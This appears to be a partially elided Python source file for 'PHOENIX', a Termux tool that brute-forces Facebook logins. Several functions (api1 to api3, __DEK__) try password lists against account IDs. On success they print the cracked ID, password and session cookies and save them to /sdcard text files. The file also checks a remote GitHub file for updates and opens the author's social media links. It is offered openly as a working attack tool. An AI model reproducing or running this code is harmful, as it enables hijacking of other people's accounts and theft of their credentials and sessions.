# OWNER BY SCRIPT : MR PHOENIX
# GITHUB LINK : MR-PHOENIX-
# MACK BY : MR PHOENIX 
...
from concurrent.futures import ThreadPoolExecutor as MrPHOENIX
from string import * 
...
bxd = ""
kex = bxd+id
myweb2 = requests.get("https://github.com/Mim1553/Radiant1/blob/main/Radiant1.txt").text
def apv():
	try:
		clear()
		x = requests.get('https://github.com/Mim1553/Radiant1/blob/main/Radiant1.txt').text
		if str("upppdate") in update:
			...
			clear()
			os.system('xdg-open https://www.facebook.com/share/g/rka9wfgMXXj23TYj/?mibextid=A7sQZp')
			...
			os.system(f"termux-open-url https://wa.me/+8801893172448?text={kex}")  	
			apv()
...
sys.stdout.write('\x1b]2;<👑PHOENIX👑>\x07')
...
\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m DEVELOPER ☞⁠￣⁠ᴥ⁠￣⁠☞  \033[1;33mPHOENIX
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m FACEBOOK  ☞⁠￣⁠ᴥ⁠￣⁠☞ MD:SHIHAB HOSSAIN PARVEZ
\033[1;31m[\033[1;32m☞⁠￣⁠ᴥ⁠￣⁠☞\033[1;31m]\033[1;32m GITHUB    ☞⁠￣⁠ᴥ⁠￣⁠☞ MiM1553
...
def menu():
        try:
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[✓] \033[0;37m EXAMPLE \033[1;32m: \033[1;31m/sdcard/PHOENIX.txt ');linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/7895Shihab?mibextid=ZbWKwL');menu()
                        elif xd in ['0','00']:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r \033[1;32mD\033[0;37mE\033[1;32mK\033[0;37mU\033[1;32m-PHOENIX-\033[1;31mM1 \033[0;37m[✓]\033[1;36m %s\033[0;37m [✓]\033[1;32m OK \033[0;37m[✓]\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[PHOENIX-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m[COKIES-🍪] {coki}");linex()
                open('/sdcard/PHOENIX-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
        #.         print(f'\r\r{Y} <[{Y}PHOENIX{Y}-{Y}CP{Y}]>{Y} '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/PHOENIX-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r \033[1;32mD\033[0;37mE\033[1;32mK\033[0;37mU\033[1;32m-PHOENIX-\033[1;31mM2 \033[0;37m[✓]\033[1;36m %s\033[0;37m [✓]\033[1;32m OK \033[0;37m[✓]\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[PHOENIX-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m[COKIES-🍪] {coki}");linex()
                open('/sdcard/PHOENIX-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
        #.         print(f'\r\r{Y} <[{Y}PHOENIX{Y}-{Y}CP{Y}]>{Y} '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r \033[1;32mD\033[0;37mE\033[1;32mK\033[0;37mU\033[1;32m-PHOENIX-\033[1;31mM3 \033[0;37m[✓]\033[1;36m %s\033[0;37m [✓]\033[1;32m OK \033[0;37m[✓]\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[PHOENIX-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m[COKIES-🍪] {coki}");linex()
                open('/sdcard/PHOENIX-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
        #.         print(f'\r\r{Y} <[{Y}PHOENIX{Y}-{Y}CP{Y}]>{Y} '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
...
def __DEK__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f'\r\r \033[1;32mD\033[0;37mE\033[1;32mK\033[0;37mU\033[1;32m-PHOENIX-\033[1;31mRANDOM \033[0;37m[✓]\033[1;36m %s\033[0;37m [✓]\033[1;32m OK \033[0;37m[✓]\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ...
    try:
        for pas in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r\r\r\033[1;32m[PHOENIX-OK]\033[1;33m {cid} | {pas}')
                        print(f'\r\r\033[1;36m[COKIES-🍪] {coki}');linex()
                        open('/sdcard/PHOENIX-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/PHOENIX-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r\r\r\033[1;32m[PHOENIX-OK]\033[1;36m {cid} | {pas}')
                        open('/sdcard/PHOENIX-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/PHOENIX-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break 
            else:
